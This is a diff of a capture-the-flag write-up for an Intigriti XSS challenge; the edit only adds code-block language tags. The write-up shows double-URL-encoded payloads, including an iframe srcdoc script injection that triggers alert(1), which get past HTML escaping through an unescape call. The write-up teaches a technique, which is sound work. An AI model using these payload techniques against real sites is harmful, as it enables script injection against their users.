@@ -69,7 +69,9 @@ Here it starts getting interesting. `displayReason` is called with the location 
 
 Trying to load a file that doesn't exist (`https://challenge.intigriti.io/reasons/20.txt`) we get the following error:
 
-```404 - 'File "20.txt" was not found in this folder.'```
+```html
+404 - 'File "20.txt" was not found in this folder.'
+```
 
 It's interesting that the filename that doesn't exist gets reflected in the error message.
 
@@ -156,7 +158,9 @@ curl https://challenge.intigriti.io/.htaccess?%3Cimg%20src=x%3E
 
 Dang, here they correctly html escape the `<` and `>`. But wait! In ❶ they use the `unescape`function before setting the innerHTML. So we should be able to double escape our payload and itshould get unescaped once by the script that shows the forbidden page and once again by the `unescape` call. Let's try it all out, by appending `.htaccess` with our double-encoded image tag to the location hash:
 
-```https://challenge.intigriti.io/#.htaccess?%253Cimg%2520src%253Dx%253E```
+```html
+https://challenge.intigriti.io/#.htaccess?%253Cimg%2520src%253Dx%253E
+```
 
 ![Successful HTML reflection](html.png)
 
@@ -176,7 +180,9 @@ But nothing happens... I completely forgot: `innerHTML` doesn't execute script t
 
 Double encoding it and appending it to `.htaccess`:
 
-```https://challenge.intigriti.io/#.htaccess?%253Ciframe%2520srcdoc%253D%2522%253Cscript%2520src%253Dreasons%252F%2527%253Balert%25281%2529%253Ba%253D%2527%253E%253C%252Fscript%253E%2522%253E%253C%252Fiframe%253E```
+```html
+https://challenge.intigriti.io/#.htaccess?%253Ciframe%2520srcdoc%253D%2522%253Cscript%2520src%253Dreasons%252F%2527%253Balert%25281%2529%253Ba%253D%2527%253E%253C%252Fscript%253E%2522%253E%253C%252Fiframe%253E
+```
 
 ![Final exploit](finished.png)
 
